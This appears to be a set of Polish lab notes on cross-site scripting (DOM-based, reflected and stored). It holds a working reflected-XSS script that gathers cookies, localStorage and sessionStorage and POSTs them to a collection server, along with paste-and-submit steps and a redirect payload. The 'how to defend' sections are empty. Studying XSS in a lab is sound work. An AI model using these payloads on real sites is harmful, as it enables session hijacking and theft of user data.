# DOM based XSS

### Lista koroków:
- zauważmy że `select.option` przesyła dane w query
- wklejając tam bezpośrednio `window.location=http...`, zostaniemy przekierowani co stanowi lukę bezpieczństwa.
- `<skrypt>` - też jest możliwy do wykonania

## Jak się bronić?


# Reflected XSS

## Przygotowanie danych
```javascript
<script>
  fetch('https://randomuser.me/api/')
    .then(it => it.json())
    .then(it => it.results.at(0).login.sha256)
    .then(token => {
        console.log('setting token -',{token})
        localStorage.setItem('auth_token',token)
    })
</script>
```

## Kradzież danych

```js
<script>
function prepareDataPack(){
  return {
    localStorage: window.localStorage,
    cookie:document.cookie,
    sessionStorage:window.sessionStorage,
    location:document.location,
  }
};

fetch('http://adam.main.pc:9000/api/victims', {
    method:'POST',
    body:JSON.stringify(prepareDataPack(), null ,2),
    mode:'no-cors'
})
</script>
```

### Lista kroków:
- skopiuj i wklej w pole `name` skrypt `kradzież danych`
- klik w `submit`
- dane zostały wysłane na serwer
- aby zobaczyć dane -> GET {{host}}/api/victims/files

## Jak się bronić?


# XSS stored

### Lista kroków
- jeżeli wrzucimy skrypt do pola `message` i zapiszemy wykona on się na naszej stronie niezauważenie.
- zapisze się do bazy danych a następnie będzie się wykonywał za każdym razem gdy odwiedzimy witrynę.
